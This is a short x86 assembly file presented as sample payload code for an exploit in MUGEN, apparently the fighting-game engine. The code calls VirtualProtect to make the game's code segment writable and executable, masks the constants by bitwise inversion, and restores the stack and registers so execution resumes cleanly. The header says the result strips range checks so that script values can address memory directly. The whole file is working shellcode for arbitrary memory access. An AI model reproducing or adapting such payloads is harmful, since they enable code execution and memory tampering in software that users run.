;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; This is some sample code for how this exploit could be used.         ;;
;; It removes range checking on var triggers, and allows any value      ;;
;; outside of (-1000,1000) to refer directly to a memory address.       ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
[bits 32]
;;;; 1. VirtualProtect the MUGEN code segment
mov eax,dword [0x67BD0324]			;; VirtualProtect ptr
push 0x67BD0344						;; lpflOldProtect
push 0x40							;; flNewProtect
push 0xFFF22FFF						;; dwSize
not dword [esp]						;; invert to 0xDD000
push 0xFFBFEFFF						;; lpAddress
not dword [esp]						;; invert to 0x401000
call eax							;; execute VirtualProtect and return here

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Finalization: Fix EBX, ESP and EIP                                   ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
xor ebx,ebx	;; required to continue processing properly
pop esp		;; restore proper esp
ret